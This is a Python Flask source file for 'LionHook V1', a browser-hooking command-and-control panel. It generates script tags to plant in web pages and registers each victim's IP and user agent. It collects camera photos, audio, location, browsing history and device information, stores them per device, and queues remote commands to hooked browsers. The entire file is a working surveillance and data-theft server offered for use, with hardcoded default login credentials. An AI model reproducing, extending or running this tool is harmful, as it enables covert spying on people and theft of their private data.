#!/usr/bin/env python3
import os
import json
import sqlite3
from flask import Flask, render_template, request, jsonify, send_file, session, redirect, url_for
from flask_sslify import SSLify
import threading
import time
import base64
import uuid
from datetime import datetime
import hashlib

app = Flask(__name__)
app.secret_key = 'lionhook_secret_key_2024'
app.config['SESSION_TYPE'] = 'filesystem'

# Force HTTPS
sslify = SSLify(app)

# Login credentials (can be changed via settings)
LOGIN_USERNAME = "ONDORK"
LOGIN_PASSWORD = "ONDORK"

# Base directories
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DEVICES_DIR = os.path.join(DATA_DIR, 'devices')

# Store active devices with WebSocket-like functionality
active_devices = {}

def ensure_directories():
    """Create necessary directories"""
    os.makedirs(DATA_DIR, exist_ok=True)
    os.makedirs(DEVICES_DIR, exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)

# Database setup with proper schema
def init_db():
    conn = sqlite3.connect('lionhook.db')
    c = conn.cursor()
    
    # Drop and recreate tables to ensure correct schema
    c.execute('''DROP TABLE IF EXISTS devices''')
    c.execute('''DROP TABLE IF EXISTS device_data''')
    c.execute('''DROP TABLE IF EXISTS settings''')
    
    # Create devices table with correct columns
    c.execute('''CREATE TABLE devices
                 (id TEXT PRIMARY KEY, 
                  ip TEXT, 
                  user_agent TEXT, 
                  status TEXT DEFAULT 'offline',
                  last_seen TEXT,
                  created_at TEXT)''')
    
    # Create device data table
    c.execute('''CREATE TABLE device_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT,
                  data_type TEXT,
                  data_content TEXT,
                  file_path TEXT,
                  created_at TEXT)''')
    
    # Create settings table
    c.execute('''CREATE TABLE settings
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  key TEXT UNIQUE,
                  value TEXT)''')
    
    # Insert default credentials
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", 
              ('username', LOGIN_USERNAME))
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", 
              ('password', LOGIN_PASSWORD))
    
    conn.commit()
    conn.close()
    print("✅ Database initialized with correct schema")

ensure_directories()
init_db()

# Custom Jinja2 filters
@app.template_filter('from_json')
def from_json_filter(value):
    try:
        return json.loads(value)
    except:
        return {"error": "Invalid JSON", "raw": value}

@app.template_filter('format_timestamp')
def format_timestamp_filter(value):
    try:
        dt = datetime.fromisoformat(value.replace('Z', '+00:00'))
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except:
        return value

def get_settings():
    """Get current settings from database"""
    conn = sqlite3.connect('lionhook.db')
    c = conn.cursor()
    c.execute("SELECT key, value FROM settings")
    settings = {row[0]: row[1] for row in c.fetchall()}
    conn.close()
    return settings

def update_settings(username, password):
    """Update settings in database"""
    conn = sqlite3.connect('lionhook.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", ('username', username))
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", ('password', password))
    conn.commit()
    conn.close()

def save_file_data(device_id, data_type, content, filename):
    """Save file data to device directory"""
    device_dir = os.path.join(DEVICES_DIR, device_id)
    os.makedirs(device_dir, exist_ok=True)
    
    # Create type-specific directories
    type_dirs = {
        'photo_front': 'photos',
        'photo_back': 'photos', 
        'audio': 'audios',
        'location': 'locations',
        'history': 'browser_data',
        'network': 'system_info',
        'battery': 'system_info',
        'device_info': 'system_info'
    }
    
    file_dir = os.path.join(device_dir, type_dirs.get(data_type, 'other_data'))
    os.makedirs(file_dir, exist_ok=True)
    
    file_path = os.path.join(file_dir, filename)
    
    # Handle base64 data (photos, audio)
    if content.startswith('data:'):
        # Extract base64 data
        header, encoded = content.split(',', 1)
        file_data = base64.b64decode(encoded)
        
        with open(file_path, 'wb') as f:
            f.write(file_data)
    else:
        # Handle text data
        with open(file_path, 'w') as f:
            f.write(content)
    
    return file_path

def update_device_status(device_id, status="online"):
    """Update device status in database"""
    conn = sqlite3.connect('lionhook.db')
    c = conn.cursor()
    c.execute("UPDATE devices SET status=?, last_seen=? WHERE id=?", 
              (status, datetime.now().isoformat(), device_id))
    conn.commit()
    conn.close()

@app.route('/')
def index():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    return redirect(url_for('dashboard'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    settings = get_settings()
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == settings.get('username', LOGIN_USERNAME) and password == settings.get('password', LOGIN_PASSWORD):
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error='Invalid credentials')
    
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    
    conn = sqlite3.connect('lionhook.db')
    c = conn.cursor()
    c.execute("SELECT * FROM devices ORDER BY created_at DESC")
    devices = c.fetchall()
    conn.close()
    
    # Separate online/offline devices
    online_devices = []
    offline_devices = []
    
    for device in devices:
        device_id = device[0]
        if device_id in active_devices and active_devices[device_id].get('online', False):
            online_devices.append(device)
        else:
            offline_devices.append(device)
    
    print(f"📊 Dashboard: {len(online_devices)} online, {len(offline_devices)} offline devices")
    return render_template('dashboard.html', 
                         online_devices=online_devices, 
                         offline_devices=offline_devices,
                         total_devices=len(devices))

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    
    settings_data = get_settings()
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username and password:
            update_settings(username, password)
            settings_data = get_settings()  # Refresh settings
            return render_template('settings.html', 
                                 settings=settings_data, 
                                 success='Credentials updated successfully!')
        else:
            return render_template('settings.html', 
                                 settings=settings_data, 
                                 error='Username and password are required!')
    
    return render_template('settings.html', settings=settings_data)

@app.route('/generate_hook')
def generate_hook():
    if 'logged_in' not in session:
        return jsonify({'error': 'Not authenticated'})
    
    hook_id = str(uuid.uuid4())[:8]
    
    hook_data = {
        'demo_url': f"https://{request.host}/demo/{hook_id}",
        'hook_url': f"https://{request.host}/hook/{hook_id}",
        'admin_panel': f"https://{request.host}/dashboard",
        'script_tag': f'<script src="https://{request.host}/hook/{hook_id}"></script>'
    }
    
    print(f"🎣 Generated hook: {hook_id}")
    return jsonify(hook_data)

@app.route('/demo/<hook_id>')
def demo_page(hook_id):
    print(f"📄 Demo page accessed: {hook_id}")
    return render_template('demo.html', hook_id=hook_id)

@app.route('/hook/<hook_id>')
def hook_script(hook_id):
    try:
        device_id = request.args.get('device_id', str(uuid.uuid4()))
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        print(f"🔗 Hook accessed - Device: {device_id}, IP: {client_ip}")
        
        conn = sqlite3.connect('lionhook.db')
        c = conn.cursor()
        
        # Check if device exists
        c.execute("SELECT id FROM devices WHERE id=?", (device_id,))
        existing_device = c.fetchone()
        
        if not existing_device:
            c.execute("INSERT INTO devices (id, ip, user_agent, status, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                     (device_id, client_ip, user_agent, 'online', datetime.now().isoformat(), datetime.now().isoformat()))
            print(f"✅ New device registered: {device_id}")
        else:
            c.execute("UPDATE devices SET status=?, last_seen=? WHERE id=?", 
                     ('online', datetime.now().isoformat(), device_id))
            print(f"🔄 Device updated: {device_id}")
        
        conn.commit()
        conn.close()
        
        # Mark device as active
        active_devices[device_id] = {
            'online': True,
            'last_ping': datetime.now(),
            'commands': []
        }
        
        # Create device directory
        device_dir = os.path.join(DEVICES_DIR, device_id)
        os.makedirs(device_dir, exist_ok=True)
        
        return render_template('hook.js', 
                             device_id=device_id, 
                             server_url=f"https://{request.host}",
                             hook_id=hook_id), 200, {'Content-Type': 'application/javascript'}
    except Exception as e:
        print(f"❌ Error in hook_script: {e}")
        return "Error", 500

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.json
        device_id = data.get('device_id')
        
        if device_id:
            active_devices[device_id] = {
                'online': True,
                'last_ping': datetime.now(),
                'commands': active_devices.get(device_id, {}).get('commands', [])
            }
            update_device_status(device_id, "online")
            print(f"💓 Heartbeat from device: {device_id}")
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"❌ Heartbeat error: {e}")
        return jsonify({'status': 'error'})

@app.route('/api/submit_data', methods=['POST'])
def submit_data():
    try:
        data = request.json
        device_id = data.get('device_id')
        data_type = data.get('type')
        content = data.get('content')
        
        print(f"📥 Data received from {device_id}: {data_type}")
        
        # Generate filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_extension = {
            'photo_front': 'jpg',
            'photo_back': 'jpg',
            'audio': 'wav',
            'location': 'json',
            'history': 'json',
            'network': 'json',
            'battery': 'json',
            'device_info': 'json'
        }.get(data_type, 'txt')
        
        filename = f"{data_type}_{timestamp}.{file_extension}"
        
        # Save file
        file_path = save_file_data(device_id, data_type, content, filename)
        
        # Store in database
        conn = sqlite3.connect('lionhook.db')
        c = conn.cursor()
        
        c.execute("INSERT INTO device_data (device_id, data_type, data_content, file_path, created_at) VALUES (?, ?, ?, ?, ?)",
                 (device_id, data_type, content, file_path, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        print(f"✅ Data saved: {data_type} for device {device_id}")
        return jsonify({'status': 'success', 'file_path': file_path})
    except Exception as e:
        print(f"❌ Submit data error: {e}")
        return jsonify({'status': 'error'})

@app.route('/api/device_data/<device_id>')
def get_device_data(device_id):
    if 'logged_in' not in session:
        return jsonify({'error': 'Not authenticated'})
    
    try:
        conn = sqlite3.connect('lionhook.db')
        c = conn.cursor()
        
        c.execute("SELECT * FROM device_data WHERE device_id=? ORDER BY created_at DESC", (device_id,))
        data = c.fetchall()
        conn.close()
        
        print(f"📊 Device data requested: {device_id} - {len(data)} items")
        return jsonify({'data': data})
    except Exception as e:
        print(f"❌ Get device data error: {e}")
        return jsonify({'error': 'Database error'})

@app.route('/api/execute_command', methods=['POST'])
def execute_command():
    if 'logged_in' not in session:
        return jsonify({'error': 'Not authenticated'})
    
    try:
        data = request.json
        device_id = data.get('device_id')
        command = data.get('command')
        
        print(f"⚡ Command sent to {device_id}: {command}")
        
        if device_id not in active_devices:
            active_devices[device_id] = {'commands': []}
            print(f"🆕 New device added to active devices: {device_id}")
        
        active_devices[device_id]['commands'].append({
            'command': command,
            'timestamp': datetime.now().isoformat()
        })
        
        print(f"✅ Command queued for {device_id}: {command}")
        return jsonify({'status': 'command_sent', 'device_id': device_id, 'command': command})
    except Exception as e:
        print(f"❌ Execute command error: {e}")
        return jsonify({'status': 'error'})

@app.route('/api/check_commands/<device_id>')
def check_commands(device_id):
    try:
        print(f"🔍 Checking commands for: {device_id}")
        
        if device_id in active_devices and 'commands' in active_devices[device_id]:
            commands = active_devices[device_id]['commands'].copy()
            active_devices[device_id]['commands'] = []
            print(f"📨 Sending {len(commands)} commands to {device_id}")
            return jsonify({'commands': commands})
        
        print(f"📭 No commands for: {device_id}")
        return jsonify({'commands': []})
    except Exception as e:
        print(f"❌ Check commands error: {e}")
        return jsonify({'commands': []})

@app.route('/files/<path:filepath>')
def serve_file(filepath):
    if 'logged_in' not in session:
        return jsonify({'error': 'Not authenticated'})
    
    try:
        safe_path = os.path.join(DEVICES_DIR, filepath)
        if os.path.exists(safe_path) and safe_path.startswith(DEVICES_DIR):
            return send_file(safe_path)
        else:
            return jsonify({'error': 'File not found'})
    except Exception as e:
        print(f"❌ Serve file error: {e}")
        return jsonify({'error': 'File error'})

@app.route('/gallery')
def gallery():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    
    try:
        conn = sqlite3.connect('lionhook.db')
        c = conn.cursor()
        
        c.execute('''SELECT d.id, d.ip, d.user_agent, d.status, COUNT(dd.id) as data_count 
                     FROM devices d 
                     LEFT JOIN device_data dd ON d.id = dd.device_id 
                     GROUP BY d.id 
                     ORDER BY d.created_at DESC''')
        devices = c.fetchall()
        conn.close()
        
        print(f"🖼️ Gallery accessed: {len(devices)} devices")
        return render_template('gallery.html', devices=devices)
    except Exception as e:
        print(f"❌ Gallery error: {e}")
        return "Error loading gallery", 500

@app.route('/device_gallery/<device_id>')
def device_gallery(device_id):
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    
    try:
        conn = sqlite3.connect('lionhook.db')
        c = conn.cursor()
        
        c.execute("SELECT * FROM device_data WHERE device_id=? ORDER BY created_at DESC", (device_id,))
        data = c.fetchall()
        
        c.execute("SELECT * FROM devices WHERE id=?", (device_id,))
        device = c.fetchone()
        conn.close()
        
        # Get file listings
        device_files = {}
        device_dir = os.path.join(DEVICES_DIR, device_id)
        if os.path.exists(device_dir):
            for root, dirs, files in os.walk(device_dir):
                category = os.path.relpath(root, device_dir)
                if category != '.':
                    device_files[category] = []
                    for file in files:
                        file_path = os.path.join(category, file)
                        full_path = os.path.join(root, file)
                        device_files[category].append({
                            'name': file,
                            'path': f"/files/{device_id}/{file_path}",
                            'size': os.path.getsize(full_path) if os.path.exists(full_path) else 0,
                            'modified': datetime.fromtimestamp(os.path.getmtime(full_path)).isoformat() if os.path.exists(full_path) else 'Unknown'
                        })
        
        print(f"📁 Device gallery: {device_id} - {len(data)} data items")
        return render_template('device_gallery.html', data=data, device=device, device_files=device_files)
    except Exception as e:
        print(f"❌ Device gallery error: {e}")
        return f"Error loading device gallery: {str(e)}", 500

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

def cleanup_old_devices():
    """Clean up devices that haven't sent heartbeat"""
    while True:
        try:
            current_time = datetime.now()
            for device_id, device_info in list(active_devices.items()):
                if (current_time - device_info['last_ping']).seconds > 60:  # 1 minute timeout
                    device_info['online'] = False
                    update_device_status(device_id, "offline")
                    print(f"💤 Device marked offline: {device_id}")
        except Exception as e:
            print(f"❌ Cleanup error: {e}")
        time.sleep(30)

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_devices, daemon=True)
cleanup_thread.start()

if __name__ == '__main__':
    ensure_directories()
    
    print("🦁 LionHook V1 Starting...")
    print("Developer: https://t.me/ondork")
    settings = get_settings()
    print("Login Credentials:")
    print(f"Username: {settings.get('username', LOGIN_USERNAME)}")
    print(f"Password: {settings.get('password', LOGIN_PASSWORD)}")
    print(f"Data Storage: {DEVICES_DIR}")
    print("\nAccess URLs:")
    print(f"Dashboard: https://localhost:5000/dashboard")
    print(f"Login: https://localhost:5000/login")
    print(f"Settings: https://localhost:5000/settings")
    print(f"Gallery: https://localhost:5000/gallery")
    print("\nGenerate hooks from dashboard!")
    
    # Generate SSL certificate if not exists
    if not os.path.exists('cert.pem') or not os.path.exists('key.pem'):
        print("Generating SSL certificate...")
        os.system('openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365 -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"')
    
    app.run(host='0.0.0.0', port=5000, threaded=True, debug=False, ssl_context=('cert.pem', 'key.pem'))
